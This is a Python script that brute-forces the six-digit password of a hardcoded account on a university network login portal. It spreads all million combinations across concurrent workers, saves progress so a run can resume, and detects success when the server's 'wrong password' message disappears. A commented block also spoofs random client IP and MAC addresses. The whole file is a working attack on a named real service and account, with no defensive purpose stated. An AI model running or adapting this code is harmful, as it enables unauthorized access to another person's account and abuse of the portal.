# coding:utf-8
import urllib2
import httplib
import gevent
from gevent import monkey
monkey.patch_all()
import time
import thread
import sys
import random
import os

#if you change this, all will be done from the very beginning
TOTAL_THREAD = 17
threadNum = 0
total = 0

url = 'https://net.zju.edu.cn/srun_port1.php?url=http://jwbinfosys.zju.edu.cn/default2.aspx'
request = urllib2.urlopen(url)
data = request.read()

#print data.decode('gb2312')


if os.path.exists('shanxun_bak') == False:
    os.mkdir('shanxun_bak')
ls = os.listdir('shanxun_bak')
files = []
for item in ls:
    if item.find('thread')>=0:
        files.append(item)
if len(files) != TOTAL_THREAD:
    for item in files:
        os.remove('shanxun_bak/'+item)

        
headers = {"x-requested-with":"XMLHttpRequest", \
	"Content-Type":"application/x-www-form-urlencoded", \
	"Accept-Language":"en-US", \
	"Connection":"Keep-Alive", \
	#"Referer":"http://weixin.zdxsd900.com/zhandian/shangyu_dianshi/index.php?userid="+userid+"&optionid="+optionid, \
	"Accept":"*/*", \
	"Accept-Encoding":"gzip, deflate", \
	#"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Mobile/9B176 MicroMessenger/4.3.2" \
    "User-Agent":"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)"\
	};  


def login(pid):    
    global total
    
    backupBase = 0
    threadNum = pid
    passwd = 999999/TOTAL_THREAD*(threadNum)
    if os.path.exists('shanxun_bak/thread'+str(pid)) == True:
        with open('shanxun_bak/thread'+str(pid), 'r') as f:
            backupBase = int(f.read())
            if backupBase<0:
                backupBase = 0
            total = total + backupBase-passwd
            print pid,'back',backupBase
            f.close()
    else:
        backupBase = passwd
        if os.path.exists('shanxun_bak') == False:
            os.mkdir('shanxun_bak')
         
    for passWD in range(backupBase, passwd+999999/TOTAL_THREAD):
        if passWD%10==0:
            with open('shanxun_bak/thread'+str(pid),'w') as f:
                f.write(str(passWD-5))
                f.close()
        #gevent.sleep(random.randint(0,2)*0.001)
        username = '18069778779@ZJUA.XY'
        user_ip = '10.180.43.62'
        mac = '54:26:96:dc:70:41'
        password = '%06d'%(passWD)
        
        '''
        user_ip = ''
        for i in range(3):
            user_ip = user_ip + str(random.randint(0,255)) + '.'
        user_ip = user_ip + str(random.randint(0,255))
        #print user_ip
        mac = ''
        for i in range(5):
            mac = mac + '%02x'%(random.randint(0,0xff)) + ':'
        mac = mac + '%02x'%(random.randint(0,0xff))
        #print mac
        '''
        params = 'action=login&username='+username+'&password='+password+'&ac_id=3&type=1&wbaredirect=www.baidu.com&mac='\
                +mac+'&user_ip='+user_ip+'&is_ldap=1&local_auth=1'    	
        while True:
            try:
                conn = httplib.HTTPConnection("net.zju.edu.cn");  
                conn.request(method="POST",url="/cgi-bin/srun_portal",body=params,headers=headers);      
            except Exception,e:
                print 'pid:','%3d'%pid,e,'connection error, try again',password
                gevent.sleep(1)
                continue
            else:
                break
        response = conn.getresponse();  
        
        res = response.read()
        total = total + 1
        print 'pid:','%2d'%pid,'trying:',password,'result:',res,'%.4f%%' %(100.0*total/999999)
        if res.find('密码错误')==-1:
            print 'found:',password
            with open('shanxun_bak/result', 'w') as f:
                f.write(password)
                f.close()
            sys.exit()
            



threads = [gevent.spawn(login, i) for i in range(TOTAL_THREAD)]
gevent.joinall(threads)            

